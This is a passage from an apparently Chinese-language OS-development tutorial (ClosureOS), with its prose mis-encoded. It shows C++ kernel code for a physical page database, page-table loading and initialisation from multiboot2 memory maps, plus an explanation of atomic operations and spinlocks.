databaseï¼‰ï¼Œè¿™ä¸€ä¸ªå†…å­˜åŒºåŸŸçš„å­˜åœ¨æ˜¯ä¸ºäº†èƒ½å¤Ÿæ›´å¥½åœ°ç®¡ç†æ‰€æœ‰çš„ç‰©ç†é¡µæ¡†ï¼Œé¦–å…ˆæˆ‘ä»¬ä½¿ç”¨å¦‚ä¸‹ç»“æ„è¡¨ç¤ºå•å¼ å†…å­˜é¡µï¼Œå…¶ä¸­ <code>type</code> å­—æ®µç”¨æ¥è¡¨ç¤ºå½“å‰å†…å­˜é¡µçš„ç±»å‹ï¼Œ<code>ref_count</code> å­—æ®µä¸ºå½“å‰é¡µé¢çš„å¼•ç”¨è®¡æ•°ï¼ˆé—²ç½®æ—¶ä¸º <code>-1</code>ï¼‰ï¼Œå…¶ä»–å­—æ®µæˆ‘ä»¬ä¼šåœ¨åç»­ä½¿ç”¨åˆ°æ—¶è¿›è¡Œè¯´æ˜ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">enum</span> &#123;<br>    PAGE_NON_EXISTED = <span class="hljs-number">0</span>,<br>    PAGE_NORMAL_MEM,<br>    PAGE_RESERVED,<br>    PAGE_ACPI_RECLAIMABLE,<br>    PAGE_NVS,<br>    PAGE_BADRAM,<br>&#125;;<br><br><span class="hljs-comment">/* for `type == PAGE_NORMAL_MEM` only */</span><br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">migrate_type</span> &#123;<br>    MIGRATE_UNMOVABLE = <span class="hljs-number">0</span>,<br>    MIGRATE_MOVABLE,<br>&#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * struct Page</span><br><span class="hljs-comment"> * - representing a `physical page frame`</span><br><span class="hljs-comment"> * - page-aligned size</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">NOTE:</span> we ONLY store some critical information at the head page, as it takes too long to assign the value</span><br><span class="hljs-comment"> * to every page, but only recording it at the head and to find the head at use is enough.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Page</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    lib::ListHead list;<br>    <span class="hljs-keyword">struct</span> &#123;<br>        <span class="hljs-comment">/* for page allocator */</span><br>        <span class="hljs-type">unsigned</span> type: <span class="hljs-number">4</span>;<br>        <span class="hljs-type">unsigned</span> migrate_type: <span class="hljs-number">4</span>;<br>        <span class="hljs-type">unsigned</span> is_free: <span class="hljs-number">1</span>; <span class="hljs-comment">/* already in freelist */</span><br>        <span class="hljs-type">unsigned</span> is_head: <span class="hljs-number">1</span>; <span class="hljs-comment">/* head of a group of pages*/</span><br>        <span class="hljs-type">unsigned</span> order: <span class="hljs-number">4</span>;<br>    &#125;;<br>    lib::atomic::<span class="hljs-type">atomic_t</span> ref_count;     <span class="hljs-comment">/* -1 for free */</span><br>    lib::atomic::<span class="hljs-type">atomic_t</span> map_count;     <span class="hljs-comment">/* mapped count in processes */</span><br>    lib::atomic::SpinLock lock;<br>    <span class="hljs-type">void</span> **freelist;    <span class="hljs-comment">/* used only when the slub is not a cpu partial */</span><br>    KMemCache *kc;  <span class="hljs-comment">/* used only when it&#x27;s a slub page */</span><br>    PagePool *pool; <span class="hljs-comment">/* SHOULD remains unchanged after initialization */</span><br>    base::<span class="hljs-type">size_t</span> obj_nr;      <span class="hljs-comment">/* used only when it&#x27;s a slub page */</span><br><br>    <span class="hljs-comment">/* unused area to make it page-aligned, maybe we can put sth else there? */</span><br>    base::<span class="hljs-type">size_t</span> unused[<span class="hljs-number">0</span>];<br>&#125; __attribute__((<span class="hljs-built_in">aligned</span>(<span class="hljs-number">64</span>)));<br></code></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬å¼•å…¥å†…å­˜é¡µæ•°æ®åº“çš„æ¦‚å¿µï¼Œè¿™æ˜¯ä¸€ä¸ªç”± <code>struct page</code> æ‰€ç»„æˆçš„æ•°ç»„ï¼Œ <strong>æ•°ç»„ä¸‹æ ‡ç›´æ¥å¯¹åº”ç‰©ç†é¡µæ¡†å·</strong> ï¼Œé€šè¿‡è¿™æ ·çš„ä¸€ä¸ªç»“æ„æˆ‘ä»¬ä¾¿èƒ½éå¸¸æ–¹ä¾¿åœ°ç®¡ç†æ‰€æœ‰çš„å†…å­˜é¡µï¼Œç”±äº <code>struct page</code> å¤§å°ä¸º 64 å­—èŠ‚ï¼Œæˆ‘ä»¬çš„å†…å­˜é¡µæ•°æ®åº“å°†ä¼šä½¿ç”¨ç›¸å½“æ•°é‡çš„å†…å­˜æ¥è¡¨ç¤ºæ‰€æœ‰çš„å†…å­˜ï¼Œä¸ºäº†ä¿è¯è¿™æ˜¯ä¸€ä¸ªè™šæ‹Ÿåœ°å€è¿ç»­çš„æ•°ç»„ï¼Œ <strong>æˆ‘ä»¬å•ç‹¬åˆ†é…ä¸€ä¸ªå†…å­˜åŒºåŸŸæ¥å­˜æ”¾ page ç»“æ„ä½“</strong> ï¼š</p><p><img src="https://s2.loli.net/2024/06/22/aeqr5QcwOKJzNfy.png"></p><p>æˆ‘ä»¬é¦–å…ˆè¿›è¡Œè¯¥åŒºåŸŸçš„æ˜ å°„å»ºç«‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_pgtable_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">int</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* ... */</span><br>    <br>    <span class="hljs-comment">/* map for page database (`struct page` array) */</span><br>    pgdb_base = (mm::Page*) mm::KERN_PAGE_DATABASE_REGION_BASE;<br>    pgdb_page_nr = (physmem_end - physmem_start) / PAGE_SIZE;<br><br>    <span class="hljs-keyword">for</span> (base::<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; pgdb_page_nr; i += mm::PGDB_PG_PAGE_NR) &#123;<br>        <span class="hljs-type">void</span> *new_page = <span class="hljs-built_in">boot_mm_page_alloc</span>();<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">IS_ERR_PTR</span>(new_page)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">PTR_ERR</span>(new_page);<br>        &#125;<br><br>        <span class="hljs-built_in">boot_memset</span>((<span class="hljs-type">void</span>*) new_page, <span class="hljs-number">0</span>, PAGE_SIZE);<br>        ret = <span class="hljs-built_in">boot_mm_pgtable_map</span>(boot_kern_pgtable,<br>                                  (mm::<span class="hljs-type">virt_addr_t</span>) &amp;pgdb_base[i],<br>                                  (mm::<span class="hljs-type">phys_addr_t</span>) new_page,<br>                                  PTE_ATTR_P | PTE_ATTR_RW);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> ret;<br>        &#125;<br>    &#125;<br>    <br>    <span class="hljs-comment">/* ... */</span><br></code></pre></td></tr></table></figure><p>å®Œæˆè¿™äº›å·¥ä½œä¹‹åï¼Œ <strong>æˆ‘ä»¬ä¾¿ç›´æ¥è£…è½½è¿™ä»½æ–°çš„é¡µè¡¨ï¼Œä½œä¸ºåç»­æ­£å¼çš„å†…æ ¸é¡µè¡¨</strong> ï¼Œå¹¶åˆå§‹åŒ–ä¸€äº›è®°å½•å†…å­˜æ®µçš„å˜é‡ï¼Œä»¥åŠå°†ä¸€äº›å¯èƒ½è¿˜ä¼šç”¨åˆ°çš„æŒ‡é’ˆé‡æ–°æ˜ å°„åˆ° <code>Direct Mapping Area</code> ï¼Œå› ä¸ºæˆ‘ä»¬ä¸èƒ½ä¿è¯åœ¨åŠ è½½æ–°é¡µè¡¨åå…¶æ‰€åœ¨å†…å­˜åŒºåŸŸä»ç„¶æœ‰æ˜ å°„ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_load_pgtable</span><span class="hljs-params">(mm::<span class="hljs-type">phys_addr_t</span> pgtable)</span> -&gt; <span class="hljs-type">void</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-string">&quot;mov    %0, %%rax;&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-string">&quot;mov    %%rax, %%cr3;&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">        :</span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;a&quot;</span> (pgtable)</span></span><br><span class="hljs-params"><span class="hljs-function">    )</span></span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_pgtable_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">int</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">/* ... */</span>    <br><br>    <span class="hljs-comment">/* load the new page table now! */</span><br>    <span class="hljs-built_in">boot_mm_load_pgtable</span>(boot_kern_pgtable);<br><br>    <span class="hljs-comment">/* init for some vals */</span><br>    mm::physmem_base = mm::KERN_DIRECT_MAP_REGION_BASE;<br>    mm::kernel_base = mm::KERN_SEG_TEXT_REGION_START;<br>    mm::vmremap_base = mm::KERN_DYNAMIC_MAP_REGION_BASE;<br>    mm::pgdb_base = pgdb_base;<br>    mm::pgdb_page_nr = pgdb_page_nr;<br><br>    <span class="hljs-comment">/* remap some variables we may still use */</span><br>    elf_info_tag = (multiboot_tag_elf_sections*) mm::<span class="hljs-built_in">phys_to_virt</span>((mm::<span class="hljs-type">phys_addr_t</span>) elf_info_tag);<br>    mmap_tag = (multiboot_tag_mmap*) mm::<span class="hljs-built_in">phys_to_virt</span>((mm::<span class="hljs-type">phys_addr_t</span>) mmap_tag);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ ¹æ® multiboot2 tags æ‰€æä¾›çš„å†…å­˜ä¿¡æ¯æ¥åˆå§‹åŒ– page ç»“æ„ä½“æ•°ç»„ï¼Œå¹¶æ ¹æ®ä¸´æ—¶çº¿æ€§å†…å­˜åˆ†é…å™¨çš„åˆ†é…åœ°å€è®¡ç®—é¡µé¢å¼•ç”¨è®¡æ•°ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_page_database_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">int</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> ret;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * as we set all page to 0 at the beginning,we don&#x27;t need to care about hole</span><br><span class="hljs-comment">     * because the type for memory hole is 0 in our design</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; mmap_entry_nr; i++) &#123;<br>        mm::<span class="hljs-type">phys_addr_t</span> base = mmap_tag-&gt;entries[i].addr;<br>        mm::<span class="hljs-type">phys_addr_t</span> end = base + mmap_tag-&gt;entries[i].len;<br>        base::<span class="hljs-type">size_t</span> pfn;<br><br>        <span class="hljs-keyword">while</span> (base &lt; end) &#123;<br>            pfn = base / PAGE_SIZE;<br>            <span class="hljs-comment">/* initialized value for every page */</span><br>            mm::pgdb_base[pfn].migrate_type = mm::MIGRATE_UNMOVABLE;    <span class="hljs-comment">/* temporarily only this only */</span><br>            mm::pgdb_base[pfn].lock.<span class="hljs-built_in">Reset</span>();<br>            mm::pgdb_base[pfn].kc = <span class="hljs-literal">nullptr</span>;<br>            mm::pgdb_base[pfn].pool = <span class="hljs-literal">nullptr</span>;<br>            mm::pgdb_base[pfn].freelist = <span class="hljs-literal">nullptr</span>;<br>            mm::pgdb_base[pfn].obj_nr = <span class="hljs-number">0</span>;<br>            lib::<span class="hljs-built_in">list_head_init</span>(&amp;mm::pgdb_base[pfn].list);<br><br>            <span class="hljs-keyword">switch</span> (mmap_tag-&gt;entries[i].type) &#123;<br>            <span class="hljs-keyword">case</span> MULTIBOOT_MEMORY_AVAILABLE:<br>                mm::pgdb_base[pfn].type = mm::PAGE_NORMAL_MEM;<br><br>                <span class="hljs-keyword">if</span> (base &lt; curr_avail || <span class="hljs-built_in">addr_is_in_used_range</span>(base)) &#123;<br>                    <span class="hljs-comment">/* used page */</span><br>                    lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span class="hljs-number">0</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">/* free page */</span><br>                    lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span class="hljs-number">-1</span>);<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MULTIBOOT_MEMORY_RESERVED:<br>                mm::pgdb_base[pfn].type = mm::PAGE_RESERVED;<br>                lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MULTIBOOT_MEMORY_ACPI_RECLAIMABLE:<br>                mm::pgdb_base[pfn].type = mm::PAGE_ACPI_RECLAIMABLE;<br>                lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MULTIBOOT_MEMORY_NVS:<br>                mm::pgdb_base[pfn].type = mm::PAGE_NVS;<br>                lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> MULTIBOOT_MEMORY_BADRAM:<br>                mm::pgdb_base[pfn].type = mm::PAGE_BADRAM;<br>                lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span class="hljs-number">0</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                mm::pgdb_base[pfn].type = mm::PAGE_UNKNOWN;<br>                lib::atomic::<span class="hljs-built_in">atomic_set</span>(&amp;mm::pgdb_base[pfn].ref_count, <span class="hljs-number">0</span>);<br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                boot_printstr(&quot;[!] Warning: unknown memory type [&quot;);</span><br><span class="hljs-comment">                boot_printnum(mmap_tag-&gt;entries[i].type);</span><br><span class="hljs-comment">                boot_printstr(&quot;] at addr: 0x&quot;);</span><br><span class="hljs-comment">                boot_printhex(base);</span><br><span class="hljs-comment">                boot_putchar(&#x27;\n&#x27;);</span><br><span class="hljs-comment">                */</span><br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            base += PAGE_SIZE;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç» <strong>åŸºæœ¬å®Œæˆè¿›å…¥é«˜åŠéƒ¨å†…æ ¸å‰çš„å‡†å¤‡äº†</strong> ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ç›´æ¥è·³è½¬åˆ°ä½äºé«˜åœ°å€çš„ä»£ç ç»§ç»­è¿›è¡Œåç»­çš„å†…æ ¸åˆå§‹åŒ–å·¥ä½œ</p><h3 id="Extra-æ·»åŠ åŸå­æ“ä½œä¸è‡ªæ—‹é”æ”¯æŒ"><a href="#Extra-æ·»åŠ åŸå­æ“ä½œä¸è‡ªæ—‹é”æ”¯æŒ" class="headerlink" title="Extra. æ·»åŠ åŸå­æ“ä½œä¸è‡ªæ—‹é”æ”¯æŒ"></a><em>Extra. æ·»åŠ åŸå­æ“ä½œä¸è‡ªæ—‹é”æ”¯æŒ</em></h3><p>åŸå­æ“ä½œï¼ˆatomic operationsï¼‰æŒ‡çš„æ˜¯ç‹¬ç«‹è€Œ <strong>ä¸å¯è¢«æ‰“æ–­çš„æ“ä½œ</strong> ï¼Œè¿™ç±»æ“ä½œå¯ä»¥ç”±å•ä¸ªæˆ–å¤šä¸ªå­æ“ä½œç»„æˆï¼Œ <strong>åŸå­å†…å­˜æ“ä½œ</strong> å³æä¾›äº†åŸå­æ€§çš„å†…å­˜æ“ä½œï¼Œå³åœ¨åŒä¸€æ—¶åˆ»ä»…æœ‰å•ä¸ªæ ¸å¿ƒèƒ½å¤Ÿè®¿é—®æŒ‡å®šå†…å­˜ï¼Œå…¶é€šå¸¸è¢«ç”¨æ¥åœ¨å¹¶å‘ç¯å¢ƒä¸­å®ç°åŒæ­¥ï¼Œæ¯”è¾ƒå¸¸ç”¨çš„æœ‰ï¼š</p><ul><li>åŸå­æ¯”è¾ƒä¸èµ‹å€¼ï¼šå¯¹æ¯”æŒ‡å®šå†…å­˜ä½ç½®ä¸Šå€¼æ˜¯å¦ä¸æŒ‡å®šå€¼ç›¸ç­‰ï¼Œè‹¥æ˜¯åˆ™èµ‹äºˆæ–°å€¼ï¼Œå¦åˆ™æŠ¥é”™</li><li>åŸå­è‡ªå¢è‡ªå‡ï¼šå°†æŒ‡å®šå†…å­˜ä½ç½®ä¸Šå€¼åŠ ä¸€æˆ–å‡ä¸€</li><li>åŸå­è¯»å†™ï¼šè·å–&#x2F;è¦†å†™æŒ‡å®šå†…å­˜ä½ç½®ä¸Šå€¼</li></ul><p>ä¾‹å¦‚åœ¨ x86 ä¸‹æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚æ·»åŠ äº† <code>lock</code> å‰ç¼€çš„æ±‡ç¼–æŒ‡ä»¤åœ¨è®¿é—®å†…å­˜çš„åŒæ—¶å®Œæˆå¯¹æ€»çº¿çš„æ§åˆ¶ï¼Œ<strong>ä»è€Œä»ç¡¬ä»¶å±‚é¢ç¡®ä¿äº†å†…å­˜è®¿é—®çš„å”¯ä¸€æ€§</strong>ï¼š</p><blockquote><p>æ³¨ï¼šè¯¥ç¤ºä¾‹ä»£ç ä»…ç”¨äºè®²è§£åŸç†ï¼Œ <strong>æœª</strong> ç”¨äº ClosureOS ä¸­</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">uint32_t</span> <span class="hljs-title">atomic_xchg</span><span class="hljs-params">(<span class="hljs-keyword">volatile</span> <span class="hljs-type">uint32_t</span> *addr, <span class="hljs-type">uint32_t</span> newval)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">uint32_t</span> result;<br><br>    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        <span class="hljs-string">&quot;lock; xchgl %0, %1&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;+m&quot;</span> (*addr), <span class="hljs-string">&quot;=a&quot;</span> (result)</span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;1&quot;</span> (newval)</span></span><br><span class="hljs-params"><span class="hljs-function">        : <span class="hljs-string">&quot;cc&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">    )</span></span>;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ GCC ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ <a href="https://gcc.gnu.org/onlinedocs/gcc-4.1.1/gcc/Atomic-Builtins.html">ç¼–è¯‘å™¨å†…ç½®çš„åŸå­å†…å­˜è®¿é—®å‡½æ•°</a> æ¥å®ç°åŸå­æ“ä½œï¼Œç¼–è¯‘å™¨åœ¨ç”Ÿæˆä»£ç æ—¶ä¾¿ä¼šè‡ªåŠ¨ç”Ÿæˆå¸¦æœ‰ <code>lock</code> ç­‰å‰ç¼€çš„æŒ‡ä»¤ï¼š</p><p><img src="https://s2.loli.net/2024/06/26/ZD6mkxFzEyc4V9f.png"></p><p>æˆ‘ä»¬å°†åŒä¸€æ—¶é—´ä»…å…è®¸ä¸€ä¸ªæ ¸å¿ƒè¿›è¡Œè®¿é—®çš„èµ„æºç§°ä¸ºä¸´ç•Œèµ„æºï¼ˆcritical resourceï¼‰ï¼Œå°†è®¿é—®ä¸´ç•Œèµ„æºçš„ä»£ç ç§°ä¸ºä¸´ç•ŒåŒºï¼ˆcritical regionï¼‰â€”â€” <strong>é”</strong> ï¼ˆlockï¼‰æ˜¯ä¸€ç§ç”¨æ¥ç¡®ä¿åœ¨åŒä¸€æ—¶é—´ä»…æœ‰ä¸€ä¸ªæ ¸å¿ƒè¿›å…¥æŒ‡å®šä¸´ç•ŒåŒºçš„æ•°æ®ç»“æ„ï¼Œè½¯ä»¶è®¾è®¡è§„èŒƒä¸­æˆ‘ä»¬é€šå¸¸è¦æ±‚ç¨‹åºåœ¨è®¿é—®ä¸´ç•Œèµ„æºå‰éœ€è¦æŒæœ‰é”ï¼Œåœ¨å®Œæˆå¯¹ä¸´ç•Œèµ„æºçš„æ“ä½œåé‡Šæ”¾é”ï¼Œä»è€Œç¡®ä¿åŒä¸€æ—¶é—´ä»…æœ‰å•ä¸ªæ ¸å¿ƒåœ¨è®¿é—®è¯¥ä¸´ç•Œèµ„æº</p><p>é€šè¿‡åŸå­å†…å­˜æ“ä½œä¸­çš„ <code>æ¯”è¾ƒä¸äº¤æ¢</code> æ“ä½œï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“å®ç°ä¸€ä¸ªç®€å•çš„é”ï¼š</p><ul><li>å®šä¹‰ä¸€ä¸ªæ•´å½¢å˜é‡ä½œä¸ºé”ï¼Œ0 ä¸ºå·²é‡Šæ”¾ï¼Œ1 ä¸ºä»è¢«æŒæœ‰</li><li>å¾ªç¯è°ƒç”¨ GCC å†…å»ºå‡½æ•° <code>__sync_bool_compare_and_swap()</code> è¿›è¡ŒåŸå­æ“ä½œï¼šæ£€æµ‹é”å˜é‡çš„å€¼ï¼Œå…¶ä¸º 0 æ—¶å°†å…¶æ”¹ä¸º 1</li><li>å®Œæˆæ“ä½œåå°†é”å˜é‡çš„å€¼æ›´æ”¹ä¸º 0</li></ul><p>ç”±äºé”åœ¨è¢«æŒæœ‰çš„æƒ…å†µä¸‹è¯·æ±‚é”çš„ä¸€æ–¹ä¼šå¾ªç¯ä¸åœåœ°æ£€æŸ¥ï¼Œå› æ­¤è¿™ç§é”è¢«ç§°ä¸º <strong>è‡ªæ—‹é”</strong> ï¼ˆspin lockï¼‰ï¼Œæˆ‘ä»¬çš„å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">volatile</span> base::<span class="hljs-type">int32_t</span> <span class="hljs-type">atomic_t</span>;<br><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> PtrType, <span class="hljs-keyword">typename</span> OldValType, <span class="hljs-keyword">typename</span> NewValType&gt;<br><span class="hljs-function">__always_inline <span class="hljs-keyword">auto</span> <span class="hljs-title">atomic_compare_and_swap</span><span class="hljs-params">(PtrType ptr, OldValType oldval, NewValType newval)</span> -&gt; <span class="hljs-type">bool</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> __sync_bool_compare_and_swap(ptr, oldval, newval);<br>&#125;<br><br><span 